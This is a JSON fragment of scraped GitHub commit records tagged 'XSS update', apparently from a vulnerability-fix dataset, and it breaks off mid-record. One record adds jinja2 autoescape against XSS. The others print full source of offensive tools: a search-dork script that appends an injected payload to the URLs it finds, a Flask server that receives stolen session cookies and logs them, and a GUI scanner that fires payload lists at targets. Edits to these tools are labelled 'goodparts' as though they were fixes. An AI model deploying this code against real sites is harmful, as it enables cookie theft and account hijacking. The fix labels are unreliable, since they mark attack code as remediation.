            "diff": "diff --git a/utils/make_eb_config.py b/utils/make_eb_config.py\nindex 8c80bfe..817409b 100644\n--- a/utils/make_eb_config.py\n+++ b/utils/make_eb_config.py\n@@ -8,7 +8,7 @@ def make_eb_config(application_name, default_region):\n     UTILS_DIR = os.path.dirname(os.path.abspath(__file__))\n     # Create the jinja2 environment.\n     # Notice the use of trim_blocks, which greatly helps control whitespace.\n-    j2_env = Environment(loader=FileSystemLoader(UTILS_DIR))\n+    j2_env = Environment(loader=FileSystemLoader(UTILS_DIR), autoescape=True)\n     return j2_env.get_template('templates/eb/config.yml').render(\n         APPLICATION_NAME=application_name,\n         DEFAULT_REGION=default_region\n",
            "files": {
                "/utils/make_eb_config.py": {
                    "changes": [
                        {
                            "diff": "\n     UTILS_DIR = os.path.dirname(os.path.abspath(__file__))\n     # Create the jinja2 environment.\n     # Notice the use of trim_blocks, which greatly helps control whitespace.\n-    j2_env = Environment(loader=FileSystemLoader(UTILS_DIR))\n+    j2_env = Environment(loader=FileSystemLoader(UTILS_DIR), autoescape=True)\n     return j2_env.get_template('templates/eb/config.yml').render(\n         APPLICATION_NAME=application_name,\n         DEFAULT_REGION=default_region\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/utils/make_eb_config.py",
                            "badparts": [
                                "    j2_env = Environment(loader=FileSystemLoader(UTILS_DIR))"
                            ],
                            "goodparts": [
                                "    j2_env = Environment(loader=FileSystemLoader(UTILS_DIR), autoescape=True)"
                            ]
                        }
                    ],
                    "source": "\nimport os import argparse from jinja2 import Environment, FileSystemLoader def make_eb_config(application_name, default_region): UTILS_DIR=os.path.dirname(os.path.abspath(__file__)) j2_env=Environment(loader=FileSystemLoader(UTILS_DIR)) return j2_env.get_template('templates/eb/config.yml').render( APPLICATION_NAME=application_name, DEFAULT_REGION=default_region ) def write_eb_config(dest, application_name, default_region): contents=make_eb_config(application_name, default_region) fh=open(dest, 'w') fh.write(contents) fh.close() if __name__=='__main__': parser=argparse.ArgumentParser(description='EB Config Maker') parser.add_argument('--dest', type=str, help='The destination of the generated eb config', default='./.elasticbeanstalk/config.yml') parser.add_argument('--name', type=str, required=True, help='The name of the application') parser.add_argument('--region', type=str, required=True, help='The default application region') args=parser.parse_args() write_eb_config(args.dest, application_name=args.name, default_region=args.region) ",
                    "sourceWithComments": "import os\nimport argparse\nfrom jinja2 import Environment, FileSystemLoader\n\n\ndef make_eb_config(application_name, default_region):\n    # Capture our current directory\n    UTILS_DIR = os.path.dirname(os.path.abspath(__file__))\n    # Create the jinja2 environment.\n    # Notice the use of trim_blocks, which greatly helps control whitespace.\n    j2_env = Environment(loader=FileSystemLoader(UTILS_DIR))\n    return j2_env.get_template('templates/eb/config.yml').render(\n        APPLICATION_NAME=application_name,\n        DEFAULT_REGION=default_region\n    )\n\n\ndef write_eb_config(dest, application_name, default_region):\n    contents = make_eb_config(application_name, default_region)\n    fh = open(dest, 'w')\n    fh.write(contents)\n    fh.close()\n\n\nif __name__ == '__main__':\n    parser = argparse.ArgumentParser(description='EB Config Maker')\n    # Optional argument\n    parser.add_argument('--dest', type=str,\n                        help='The destination of the generated eb config',\n                        default='./.elasticbeanstalk/config.yml')\n\n    parser.add_argument('--name', type=str,\n                        required=True,\n                        help='The name of the application')\n\n    parser.add_argument('--region', type=str,\n                        required=True,\n                        help='The default application region')\n\n    args = parser.parse_args()\n\n    write_eb_config(args.dest, application_name=args.name, default_region=args.region)\n"
                }
            },
            "msg": ":bug: Add autoescape=True for jinja2 to prevent XSS\n\n>> Issue: [B701:jinja2_autoescape_false] By default, jinja2 sets autoescape to False. Consider using autoescape=True or use the select_autoescape function to mitigate XSS vulnerabilities.\n   Severity: High   Confidence: High\n   Location: ./utils/make_eb_config.py:11\n   More Info: https://bandit.readthedocs.io/en/latest/plugins/b701_jinja2_autoescape_false.html"
        }
    },
    "https://github.com/FajarTheGGman/RoseKiller": {
        "6b303259f62432bcb323721f038b4396e356ff6f": {
            "url": "https://api.github.com/repos/FajarTheGGman/RoseKiller/commits/6b303259f62432bcb323721f038b4396e356ff6f",
            "html_url": "https://github.com/FajarTheGGman/RoseKiller/commit/6b303259f62432bcb323721f038b4396e356ff6f",
            "sha": "6b303259f62432bcb323721f038b4396e356ff6f",
            "keyword": "XSS update",
            "diff": "diff --git a/content/xss.py b/content/xss.py\nindex 7984abf..a9b9db6 100644\n--- a/content/xss.py\n+++ b/content/xss.py\n@@ -7,10 +7,9 @@ class Xss:\n     def main():\n         user_dork = str(input(\"[Input Dork] >_ \"))\n         req = url.PoolManager()\n-        for page in range(4):\n-            send = req.request(\"GET\", \"http://www1.search-results.com/web?q=\" + user_dork + \"&page=\" + str(page))\n-            parser = BeautifulSoup(send.data, features=\"lxml\")\n-            for link in parser.find_all('cite'):\n-                result = link.string\n-                x = str(input(\"[Input Script] >_ \"))\n-                print(str(result) + \"'\" + \"<marquee style='background:red'>\" + x + \"</marquee>\")\n+        send = req.request(\"GET\", \"http://www1.search-results.com/web?q=\" + user_dork + \"&page=\" + str(page))\n+        parser = BeautifulSoup(send.data, features=\"lxml\")\n+        for link in parser.find_all('cite'):\n+            result = link.string\n+            x = str(input(\"[Input Script] >_ \"))\n+            print(str(result) + \"'\" + \"<marquee style='background:red'>\" + x + \"</marquee>\")\n",
            "message": "",
            "files": {
                "/content/xss.py": {
                    "changes": [
                        {
                            "diff": "\n     def main():\n         user_dork = str(input(\"[Input Dork] >_ \"))\n         req = url.PoolManager()\n-        for page in range(4):\n-            send = req.request(\"GET\", \"http://www1.search-results.com/web?q=\" + user_dork + \"&page=\" + str(page))\n-            parser = BeautifulSoup(send.data, features=\"lxml\")\n-            for link in parser.find_all('cite'):\n-                result = link.string\n-                x = str(input(\"[Input Script] >_ \"))\n-                print(str(result) + \"'\" + \"<marquee style='background:red'>\" + x + \"</marquee>\")\n+        send = req.request(\"GET\", \"http://www1.search-results.com/web?q=\" + user_dork + \"&page=\" + str(page))\n+        parser = BeautifulSoup(send.data, features=\"lxml\")\n+        for link in parser.find_all('cite'):\n+            result = link.string\n+            x = str(input(\"[Input Script] >_ \"))\n+            print(str(result) + \"'\" + \"<marquee style='background:red'>\" + x + \"</marquee>\")\n",
                            "add": 6,
                            "remove": 7,
                            "filename": "/content/xss.py",
                            "badparts": [
                                "        for page in range(4):",
                                "            send = req.request(\"GET\", \"http://www1.search-results.com/web?q=\" + user_dork + \"&page=\" + str(page))",
                                "            parser = BeautifulSoup(send.data, features=\"lxml\")",
                                "            for link in parser.find_all('cite'):",
                                "                result = link.string",
                                "                x = str(input(\"[Input Script] >_ \"))",
                                "                print(str(result) + \"'\" + \"<marquee style='background:red'>\" + x + \"</marquee>\")"
                            ],
                            "goodparts": [
                                "        send = req.request(\"GET\", \"http://www1.search-results.com/web?q=\" + user_dork + \"&page=\" + str(page))",
                                "        parser = BeautifulSoup(send.data, features=\"lxml\")",
                                "        for link in parser.find_all('cite'):",
                                "            result = link.string",
                                "            x = str(input(\"[Input Script] >_ \"))",
                                "            print(str(result) + \"'\" + \"<marquee style='background:red'>\" + x + \"</marquee>\")"
                            ]
                        }
                    ],
                    "source": "\nimport urllib3 as url from pyquery import PyQuery from bs4 import BeautifulSoup import requests class Xss: def main(): user_dork=str(input(\"[Input Dork] >_ \")) req=url.PoolManager() for page in range(4): send=req.request(\"GET\", \"http://www1.search-results.com/web?q=\" +user_dork +\"&page=\" +str(page)) parser=BeautifulSoup(send.data, features=\"lxml\") for link in parser.find_all('cite'): result=link.string x=str(input(\"[Input Script] >_ \")) print(str(result) +\"'\" +\"<marquee style='background:red'>\" +x +\"</marquee>\") ",
                    "sourceWithComments": "import urllib3 as url\nfrom pyquery import PyQuery\nfrom bs4 import BeautifulSoup\nimport requests\n\nclass Xss:\n    def main():\n        user_dork = str(input(\"[Input Dork] >_ \"))\n        req = url.PoolManager()\n        for page in range(4):\n            send = req.request(\"GET\", \"http://www1.search-results.com/web?q=\" + user_dork + \"&page=\" + str(page))\n            parser = BeautifulSoup(send.data, features=\"lxml\")\n            for link in parser.find_all('cite'):\n                result = link.string\n                x = str(input(\"[Input Script] >_ \"))\n                print(str(result) + \"'\" + \"<marquee style='background:red'>\" + x + \"</marquee>\")\n"
                }
            },
            "msg": "Update xss.py"
        },
        "9bb7a1ac857c2dce57118beb79bb3a343f6b51ec": {
            "url": "https://api.github.com/repos/FajarTheGGman/RoseKiller/commits/9bb7a1ac857c2dce57118beb79bb3a343f6b51ec",
            "html_url": "https://github.com/FajarTheGGman/RoseKiller/commit/9bb7a1ac857c2dce57118beb79bb3a343f6b51ec",
            "message": "Update xss.py",
            "sha": "9bb7a1ac857c2dce57118beb79bb3a343f6b51ec",
            "keyword": "XSS update",
            "diff": "diff --git a/content/xss.py b/content/xss.py\nindex a9b9db6..feaf281 100644\n--- a/content/xss.py\n+++ b/content/xss.py\n@@ -1,5 +1,4 @@\n import urllib3 as url\n-from pyquery import PyQuery\n from bs4 import BeautifulSoup\n import requests\n \n@@ -7,9 +6,13 @@ class Xss:\n     def main():\n         user_dork = str(input(\"[Input Dork] >_ \"))\n         req = url.PoolManager()\n-        send = req.request(\"GET\", \"http://www1.search-results.com/web?q=\" + user_dork + \"&page=\" + str(page))\n-        parser = BeautifulSoup(send.data, features=\"lxml\")\n+        send = req.request(\"GET\", \"http://www1.search-results.com/web?q=\" + user_dork)\n+        parser = BeautifulSoup(send.data, features=\"html.parser\")\n+        x = str(input(\"[Message] >_ \"))\n+        print(\"[+] Here's the result ! \\n\")\n+        print(\"-----------------------------------------\")\n         for link in parser.find_all('cite'):\n             result = link.string\n-            x = str(input(\"[Input Script] >_ \"))\n-            print(str(result) + \"'\" + \"<marquee style='background:red'>\" + x + \"</marquee>\")\n+            print(\"[+] > \" + str(result) + \"'\" + \"<marquee style='background:red'>\" + x + \"</marquee>\")\n+\n+        print(\"-----------------------------------------\")\n",
            "files": {
                "/content/xss.py": {
                    "changes": [
                        {
                            "diff": "\n import urllib3 as url\n-from pyquery import PyQuery\n from bs4 import BeautifulSoup\n import requests\n \n",
                            "add": 0,
                            "remove": 1,
                            "filename": "/content/xss.py",
                            "badparts": [
                                "from pyquery import PyQuery"
                            ],
                            "goodparts": []
                        },
                        {
                            "diff": "\n     def main():\n         user_dork = str(input(\"[Input Dork] >_ \"))\n         req = url.PoolManager()\n-        send = req.request(\"GET\", \"http://www1.search-results.com/web?q=\" + user_dork + \"&page=\" + str(page))\n-        parser = BeautifulSoup(send.data, features=\"lxml\")\n+        send = req.request(\"GET\", \"http://www1.search-results.com/web?q=\" + user_dork)\n+        parser = BeautifulSoup(send.data, features=\"html.parser\")\n+        x = str(input(\"[Message] >_ \"))\n+        print(\"[+] Here's the result ! \\n\")\n+        print(\"-----------------------------------------\")\n         for link in parser.find_all('cite'):\n             result = link.string\n-            x = str(input(\"[Input Script] >_ \"))\n-            print(str(result) + \"'\" + \"<marquee style='background:red'>\" + x + \"</marquee>\")\n+            print(\"[+] > \" + str(result) + \"'\" + \"<marquee style='background:red'>\" + x + \"</marquee>\")\n+\n+        print(\"-----------------------------------------\")\n",
                            "add": 8,
                            "remove": 4,
                            "filename": "/content/xss.py",
                            "badparts": [
                                "        send = req.request(\"GET\", \"http://www1.search-results.com/web?q=\" + user_dork + \"&page=\" + str(page))",
                                "        parser = BeautifulSoup(send.data, features=\"lxml\")",
                                "            x = str(input(\"[Input Script] >_ \"))",
                                "            print(str(result) + \"'\" + \"<marquee style='background:red'>\" + x + \"</marquee>\")"
                            ],
                            "goodparts": [
                                "        send = req.request(\"GET\", \"http://www1.search-results.com/web?q=\" + user_dork)",
                                "        parser = BeautifulSoup(send.data, features=\"html.parser\")",
                                "        x = str(input(\"[Message] >_ \"))",
                                "        print(\"[+] Here's the result ! \\n\")",
                                "        print(\"-----------------------------------------\")",
                                "            print(\"[+] > \" + str(result) + \"'\" + \"<marquee style='background:red'>\" + x + \"</marquee>\")",
                                "        print(\"-----------------------------------------\")"
                            ]
                        }
                    ],
                    "source": "\nimport urllib3 as url from pyquery import PyQuery from bs4 import BeautifulSoup import requests class Xss: def main(): user_dork=str(input(\"[Input Dork] >_ \")) req=url.PoolManager() send=req.request(\"GET\", \"http://www1.search-results.com/web?q=\" +user_dork +\"&page=\" +str(page)) parser=BeautifulSoup(send.data, features=\"lxml\") for link in parser.find_all('cite'): result=link.string x=str(input(\"[Input Script] >_ \")) print(str(result) +\"'\" +\"<marquee style='background:red'>\" +x +\"</marquee>\") ",
                    "sourceWithComments": "import urllib3 as url\nfrom pyquery import PyQuery\nfrom bs4 import BeautifulSoup\nimport requests\n\nclass Xss:\n    def main():\n        user_dork = str(input(\"[Input Dork] >_ \"))\n        req = url.PoolManager()\n        send = req.request(\"GET\", \"http://www1.search-results.com/web?q=\" + user_dork + \"&page=\" + str(page))\n        parser = BeautifulSoup(send.data, features=\"lxml\")\n        for link in parser.find_all('cite'):\n            result = link.string\n            x = str(input(\"[Input Script] >_ \"))\n            print(str(result) + \"'\" + \"<marquee style='background:red'>\" + x + \"</marquee>\")\n"
                }
            },
            "msg": "Update xss.py"
        }
    },
    "https://github.com/knassar702/steal-cookie": {
        "f89875a106cac251e066535823c3fada522a7ae1": {
            "url": "https://api.github.com/repos/knassar702/steal-cookie/commits/f89875a106cac251e066535823c3fada522a7ae1",
            "html_url": "https://github.com/knassar702/steal-cookie/commit/f89875a106cac251e066535823c3fada522a7ae1",
            "sha": "f89875a106cac251e066535823c3fada522a7ae1",
            "keyword": "XSS update",
            "diff": "diff --git a/xss.py b/xss.py\nindex 53802d8..f39f610 100644\n--- a/xss.py\n+++ b/xss.py\n@@ -3,7 +3,7 @@\n app = Flask(__name__)\n @app.route('/')\n def index():\n-\treturn 'steal cookie :) '\n+\treturn 'Hello ^_^'\n @app.route('/cookie',methods=['GET','POST'])\n def steal():\n \tif request.method == \"GET\" or request.method == \"POST\":\n",
            "message": "",
            "files": {
                "/xss.py": {
                    "changes": [
                        {
                            "diff": "\n app = Flask(__name__)\n @app.route('/')\n def index():\n-\treturn 'steal cookie :) '\n+\treturn 'Hello ^_^'\n @app.route('/cookie',methods=['GET','POST'])\n def steal():\n \tif request.method == \"GET\" or request.method == \"POST\":\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/xss.py",
                            "badparts": [
                                "\treturn 'steal cookie :) '"
                            ],
                            "goodparts": [
                                "\treturn 'Hello ^_^'"
                            ]
                        }
                    ],
                    "source": "\nfrom flask import Flask,request from termcolor import colored app=Flask(__name__) @app.route('/') def index(): \treturn 'steal cookie:) ' @app.route('/cookie',methods=['GET','POST']) def steal(): \tif request.method==\"GET\" or request.method==\"POST\": \t\tdata=request.values \t\tcookie=data.get('cookie') \t\twith open('cookies.txt',mode='a') as f: \t\t\tf.write('\\n---------------------------\\n'+cookie+'\\n---------------------------\\n') \t\tprint(colored('\\n\\n[+] ','green')+'New Cookie..\\n\\n') \t\treturn 'Thanks:)' if __name__=='__main__': \tapp.run() ",
                    "sourceWithComments": "from flask import Flask,request\nfrom termcolor import colored\napp = Flask(__name__)\n@app.route('/')\ndef index():\n\treturn 'steal cookie :) '\n@app.route('/cookie',methods=['GET','POST'])\ndef steal():\n\tif request.method == \"GET\" or request.method == \"POST\":\n\t\tdata = request.values\n\t\tcookie = data.get('cookie')\n\t\twith open('cookies.txt',mode='a') as f:\n\t\t\tf.write('\\n---------------------------\\n'+cookie+'\\n---------------------------\\n')\n\t\tprint(colored('\\n\\n[+] ','green')+'New Cookie ..\\n\\n')\n\t\treturn 'Thanks :)'\nif __name__ == '__main__':\n\tapp.run()\n"
                }
            },
            "msg": "Update xss.py"
        },
        "33993d2dca4259e574211b8fa84032894b278bb0": {
            "url": "https://api.github.com/repos/knassar702/steal-cookie/commits/33993d2dca4259e574211b8fa84032894b278bb0",
            "html_url": "https://github.com/knassar702/steal-cookie/commit/33993d2dca4259e574211b8fa84032894b278bb0",
            "sha": "33993d2dca4259e574211b8fa84032894b278bb0",
            "keyword": "XSS update",
            "diff": "diff --git a/xss.py b/xss.py\nindex 4d5d3e8..db031bf 100644\n--- a/xss.py\n+++ b/xss.py\n@@ -1,8 +1,8 @@\n from flask import Flask,request\n from termcolor import colored\n from time import sleep\n-print ('\\n\\t[ Steal Cookie Using Xss .. ]\\n\\n')\n-print(colored('\\n\\n[*] ','yellow')+'Coded By : Khaled Nassar @knassar702\\n\\n')\n+print ('\\n\\t[ Steal Cookie Using Xss .. ]\\n')\n+print(colored('\\n[*] ','yellow')+'Coded By : Khaled Nassar @knassar702\\n\\n')\n sleep(2)\n app = Flask(__name__)\n @app.route('/')\n",
            "message": "",
            "files": {
                "/xss.py": {
                    "changes": [
                        {
                            "diff": "\n from flask import Flask,request\n from termcolor import colored\n from time import sleep\n-print ('\\n\\t[ Steal Cookie Using Xss .. ]\\n\\n')\n-print(colored('\\n\\n[*] ','yellow')+'Coded By : Khaled Nassar @knassar702\\n\\n')\n+print ('\\n\\t[ Steal Cookie Using Xss .. ]\\n')\n+print(colored('\\n[*] ','yellow')+'Coded By : Khaled Nassar @knassar702\\n\\n')\n sleep(2)\n app = Flask(__name__)\n @app.route('/')\n",
                            "add": 2,
                            "remove": 2,
                            "filename": "/xss.py",
                            "badparts": [
                                "print ('\\n\\t[ Steal Cookie Using Xss .. ]\\n\\n')",
                                "print(colored('\\n\\n[*] ','yellow')+'Coded By : Khaled Nassar @knassar702\\n\\n')"
                            ],
                            "goodparts": [
                                "print ('\\n\\t[ Steal Cookie Using Xss .. ]\\n')",
                                "print(colored('\\n[*] ','yellow')+'Coded By : Khaled Nassar @knassar702\\n\\n')"
                            ]
                        }
                    ],
                    "source": "\nfrom flask import Flask,request from termcolor import colored from time import sleep print('\\n\\t[ Steal Cookie Using Xss..]\\n\\n') print(colored('\\n\\n[*] ','yellow')+'Coded By: Khaled Nassar @knassar702\\n\\n') sleep(2) app=Flask(__name__) @app.route('/') def index(): \treturn 'Hello ^_^' @app.route('/cookie',methods=['GET','POST']) def steal(): \tif request.method==\"GET\" or request.method==\"POST\": \t\tdata=request.values \t\tcookie=data.get('cookie') \t\twith open('cookies.txt',mode='a') as f: \t\t\tf.write('\\n---------------------------\\n'+cookie+'\\n---------------------------\\n') \t\tprint(colored('\\n\\n[+] ','green')+'New Cookie..\\n\\n') \t\treturn 'Thanks:)' if __name__=='__main__': \tapp.run() ",
                    "sourceWithComments": "from flask import Flask,request\nfrom termcolor import colored\nfrom time import sleep\nprint ('\\n\\t[ Steal Cookie Using Xss .. ]\\n\\n')\nprint(colored('\\n\\n[*] ','yellow')+'Coded By : Khaled Nassar @knassar702\\n\\n')\nsleep(2)\napp = Flask(__name__)\n@app.route('/')\ndef index():\n\treturn 'Hello ^_^'\n@app.route('/cookie',methods=['GET','POST'])\ndef steal():\n\tif request.method == \"GET\" or request.method == \"POST\":\n\t\tdata = request.values\n\t\tcookie = data.get('cookie')\n\t\twith open('cookies.txt',mode='a') as f:\n\t\t\tf.write('\\n---------------------------\\n'+cookie+'\\n---------------------------\\n')\n\t\tprint(colored('\\n\\n[+] ','green')+'New Cookie ..\\n\\n')\n\t\treturn 'Thanks :)'\nif __name__ == '__main__':\n\tapp.run()\n"
                }
            },
            "msg": "Update xss.py"
        },
        "d20b8de6b838a490155218b2306c87f6060713a6": {
            "url": "https://api.github.com/repos/knassar702/steal-cookie/commits/d20b8de6b838a490155218b2306c87f6060713a6",
            "html_url": "https://github.com/knassar702/steal-cookie/commit/d20b8de6b838a490155218b2306c87f6060713a6",
            "message": "Update xss.py",
            "sha": "d20b8de6b838a490155218b2306c87f6060713a6",
            "keyword": "XSS update",
            "diff": "diff --git a/xss.py b/xss.py\nindex db031bf..72293e9 100644\n--- a/xss.py\n+++ b/xss.py\n@@ -1,6 +1,14 @@\n-from flask import Flask,request\n-from termcolor import colored\n-from time import sleep\n+try:\n+\tfrom flask import Flask,request\n+\tfrom termcolor import colored\n+\tfrom time import sleep\n+except:\n+\tprint('[!] Install The Modules .. ')\n+\timport os\n+\tos.system('pip install flask')\n+\tos.system('pip install termcolor')\n+\tos.system('pip install time')\n+\tsys.exit()\n print ('\\n\\t[ Steal Cookie Using Xss .. ]\\n')\n print(colored('\\n[*] ','yellow')+'Coded By : Khaled Nassar @knassar702\\n\\n')\n sleep(2)\n",
            "files": {
                "/xss.py": {
                    "changes": [
                        {
                            "diff": "\n-from flask import Flask,request\n-from termcolor import colored\n-from time import sleep\n+try:\n+\tfrom flask import Flask,request\n+\tfrom termcolor import colored\n+\tfrom time import sleep\n+except:\n+\tprint('[!] Install The Modules .. ')\n+\timport os\n+\tos.system('pip install flask')\n+\tos.system('pip install termcolor')\n+\tos.system('pip install time')\n+\tsys.exit()\n print ('\\n\\t[ Steal Cookie Using Xss .. ]\\n')\n print(colored('\\n[*] ','yellow')+'Coded By : Khaled Nassar @knassar702\\n\\n')\n sleep(2)\n",
                            "add": 11,
                            "remove": 3,
                            "filename": "/xss.py",
                            "badparts": [
                                "from flask import Flask,request",
                                "from termcolor import colored",
                                "from time import sleep"
                            ],
                            "goodparts": [
                                "try:",
                                "\tfrom flask import Flask,request",
                                "\tfrom termcolor import colored",
                                "\tfrom time import sleep",
                                "except:",
                                "\tprint('[!] Install The Modules .. ')",
                                "\tos.system('pip install flask')",
                                "\tos.system('pip install termcolor')",
                                "\tos.system('pip install time')",
                                "\tsys.exit()"
                            ]
                        }
                    ],
                    "source": "\nfrom flask import Flask,request from termcolor import colored from time import sleep print('\\n\\t[ Steal Cookie Using Xss..]\\n') print(colored('\\n[*] ','yellow')+'Coded By: Khaled Nassar @knassar702\\n\\n') sleep(2) app=Flask(__name__) @app.route('/') def index(): \treturn 'Hello ^_^' @app.route('/cookie',methods=['GET','POST']) def steal(): \tif request.method==\"GET\" or request.method==\"POST\": \t\tdata=request.values \t\tcookie=data.get('cookie') \t\twith open('cookies.txt',mode='a') as f: \t\t\tf.write('\\n---------------------------\\n'+cookie+'\\n---------------------------\\n') \t\tprint(colored('\\n\\n[+] ','green')+'New Cookie..\\n\\n') \t\treturn 'Thanks:)' if __name__=='__main__': \tapp.run() ",
                    "sourceWithComments": "from flask import Flask,request\nfrom termcolor import colored\nfrom time import sleep\nprint ('\\n\\t[ Steal Cookie Using Xss .. ]\\n')\nprint(colored('\\n[*] ','yellow')+'Coded By : Khaled Nassar @knassar702\\n\\n')\nsleep(2)\napp = Flask(__name__)\n@app.route('/')\ndef index():\n\treturn 'Hello ^_^'\n@app.route('/cookie',methods=['GET','POST'])\ndef steal():\n\tif request.method == \"GET\" or request.method == \"POST\":\n\t\tdata = request.values\n\t\tcookie = data.get('cookie')\n\t\twith open('cookies.txt',mode='a') as f:\n\t\t\tf.write('\\n---------------------------\\n'+cookie+'\\n---------------------------\\n')\n\t\tprint(colored('\\n\\n[+] ','green')+'New Cookie ..\\n\\n')\n\t\treturn 'Thanks :)'\nif __name__ == '__main__':\n\tapp.run()\n"
                }
            },
            "msg": "Update xss.py"
        }
    },
    "https://github.com/AlaBouali/XSSonar": {
        "7b0f9febbb71120e4c7e79464f374d5dcd1dd6f1": {
            "url": "https://api.github.com/repos/AlaBouali/XSSonar/commits/7b0f9febbb71120e4c7e79464f374d5dcd1dd6f1",
            "html_url": "https://github.com/AlaBouali/XSSonar/commit/7b0f9febbb71120e4c7e79464f374d5dcd1dd6f1",
            "sha": "7b0f9febbb71120e4c7e79464f374d5dcd1dd6f1",
            "keyword": "XSS update",
            "diff": "diff --git a/xss.py b/xss.py\nindex 2e81dfe..a24816c 100644\n--- a/xss.py\n+++ b/xss.py\n@@ -79,7 +79,7 @@ def kill():\n ua=[\"\"]\n ua+=bane.ua\n li=bane.read_file('xss.txt')\n-pl=[]\n+pl=['']\n for x in li:\n  pl.append(x.strip())\n prox=[\"\"]\n",
            "message": "",
            "files": {
                "/xss.py": {
                    "changes": [
                        {
                            "diff": "\n ua=[\"\"]\n ua+=bane.ua\n li=bane.read_file('xss.txt')\n-pl=[]\n+pl=['']\n for x in li:\n  pl.append(x.strip())\n prox=[\"\"]\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/xss.py",
                            "badparts": [
                                "pl=[]"
                            ],
                            "goodparts": [
                                "pl=['']"
                            ]
                        }
                    ],
                    "source": "\nimport sys,threading,time from datetime import datetime try: from tkinter import * from tkinter import ttk except: print(\"You need to install: tkinter\") sys.exit() try: import bane except: print(\"You need to install: bane\") sys.exit() class sc(threading.Thread): def run(self): global stop ti=time.time() print(\"=\"*25) print(\"\\n[*]Target:{}\\n[*]Date:{}\".format(target.get(),datetime.now().strftime(\"%d/%m/%Y %H:%M:%S\"))) crl=[target.get()] if crawl.get()=='On': crl+=bane.crawl(target.get(),bypass=True) pr=proxy.get() if len(pr)==0: pr=None if method.get()==\"GET\": get=True post=False elif method.get()==\"POST\": get=False post=True else: get=True post=True fresh=False if refresh.get()==\"On\": fresh=True ck=None c=cookie.get() if len(c)>0: ck=c for x in crl: if stop==True: break print(\"[*]URL:{}\".format(x)) bane.xss(x,payload=payload.get(),proxy=pr,get=get,post=post,user_agent=user_agent.get(),fresh=fresh,cookie=ck) print(\"[*]Test was finished at:{}\\n[*]Duration:{} seconds\\n\".format(datetime.now().strftime(\"%d/%m/%Y %H:%M:%S\"),int(time.time()-ti))) print(\"=\"*25) stop=False def scan(): sc().start() class ki(threading.Thread): def run(self): global stop stop=True def kill(): ki().start() main=Tk() main.title(\"XSS Sonar\") main.configure(background='light sky blue') Label(main, text=\"Target:\",background='light sky blue').grid(row=0) Label(main, text=\"Cookie:(Optional)\",background='light sky blue').grid(row=1) Label(main, text=\"Method:\",background='light sky blue').grid(row=2) Label(main, text=\"Timeout:\",background='light sky blue').grid(row=3) Label(main, text=\"User-Agent:\",background='light sky blue').grid(row=4) Label(main, text=\"Payload:\",background='light sky blue').grid(row=5) Label(main, text=\"HTTP Proxy:\",background='light sky blue').grid(row=6) Label(main, text=\"Refresh:\",background='light sky blue').grid(row=7) Label(main, text=\"Crawl\",background='light sky blue').grid(row=8) Label(main, text=\"\",background='light sky blue').grid(row=9) Label(main, text=\"\",background='light sky blue').grid(row=10) ua=[\"\"] ua+=bane.ua li=bane.read_file('xss.txt') pl=[] for x in li: pl.append(x.strip()) prox=[\"\"] prox+=bane.http(200) global target target=Entry(main) target.insert(0,'http://') global cookie cookie=Entry(main) global method method=ttk.Combobox(main, values=[\"GET & POST\", \"GET\", \"POST\"]) global timeout timeout=ttk.Combobox(main, values=range(1,61)) timeout.current(14) global user_agent user_agent=ttk.Combobox(main, values=ua) user_agent.current(1) global payload payload=ttk.Combobox(main, values=pl) payload.current(0) global proxy proxy=ttk.Combobox(main, values=prox) global refresh refresh=ttk.Combobox(main, values=[\"On\", \"Off\"]) global crawl crawl=ttk.Combobox(main, values=[\"On\", \"Off\"]) target.grid(row=0, column=1) target.config(width=30) cookie.grid(row=1, column=1) cookie.config(width=30) method.grid(row=2, column=1) method.current(0) method.config(width=30) timeout.grid(row=3, column=1) timeout.config(width=30) user_agent.grid(row=4, column=1) user_agent.config(width=30) payload.grid(row=5, column=1) payload.config(width=30) proxy.grid(row=6, column=1) proxy.current(0) proxy.config(width=30) refresh.grid(row=7, column=1) refresh.current(1) refresh.config(width=30) crawl.grid(row=8, column=1) crawl.current(0) crawl.config(width=30) Button(main, text='Quit', command=main.destroy).grid(row=11, column=0, sticky=W, pady=4) Button(main, text='Stop', command=kill).grid(row=11, column=2, sticky=W, pady=4) Button(main, text='Scan', command=scan).grid(row=11, column=4, sticky=W, pady=4) Label(main, text=\"\\n\\nCoder: Ala Bouali\\nGithub: https://github.com/AlaBouali\\nE-mail: trap.leader.123@gmail.com\\n\\nDisclaimer:\\nThis tool is for educational purposes only!!!\\n\\n\\n\", background='light sky blue').grid(row=12,column=1) mainloop() ",
                    "sourceWithComments": "import sys,threading,time\nfrom datetime import datetime\ntry:\n from tkinter import *\n from tkinter import ttk\nexcept:\n print(\"You need to install: tkinter\")\n sys.exit()\ntry:\n import bane\nexcept:\n print(\"You need to install: bane\")\n sys.exit()\n\nclass sc(threading.Thread):\n def run(self):\n  global stop\n  ti=time.time()\n  print(\"=\"*25)\n  print(\"\\n[*]Target: {}\\n[*]Date: {}\".format(target.get(),datetime.now().strftime(\"%d/%m/%Y %H:%M:%S\")))\n  crl=[target.get()]\n  if crawl.get()=='On':\n   crl+=bane.crawl(target.get(),bypass=True)\n  pr=proxy.get()\n  if len(pr)==0:\n   pr=None\n  if method.get()==\"GET\":\n   get=True\n   post=False\n  elif method.get()==\"POST\":\n   get=False\n   post=True\n  else:\n   get=True\n   post=True\n  fresh=False\n  if refresh.get()==\"On\":\n   fresh=True\n  ck=None\n  c=cookie.get()\n  if len(c)>0:\n   ck=c\n  for x in crl:\n   if stop==True:\n    break\n   print(\"[*]URL: {}\".format(x))\n   bane.xss(x,payload=payload.get(),proxy=pr,get=get,post=post,user_agent=user_agent.get(),fresh=fresh,cookie=ck)\n  print(\"[*]Test was finished at: {}\\n[*]Duration: {} seconds\\n\".format(datetime.now().strftime(\"%d/%m/%Y %H:%M:%S\"),int(time.time()-ti)))\n  print(\"=\"*25)\n\nstop=False\n\ndef scan():\n sc().start()\n\nclass ki(threading.Thread):\n def run(self):\n  global stop\n  stop=True\n\ndef kill():\n ki().start()\n\nmain = Tk()\nmain.title(\"XSS Sonar\")\nmain.configure(background='light sky blue')\nLabel(main, text = \"Target:\",background='light sky blue').grid(row=0)\nLabel(main, text = \"Cookie: (Optional)\",background='light sky blue').grid(row=1)\nLabel(main, text = \"Method:\",background='light sky blue').grid(row=2)\nLabel(main, text = \"Timeout:\",background='light sky blue').grid(row=3)\nLabel(main, text = \"User-Agent:\",background='light sky blue').grid(row=4)\nLabel(main, text = \"Payload:\",background='light sky 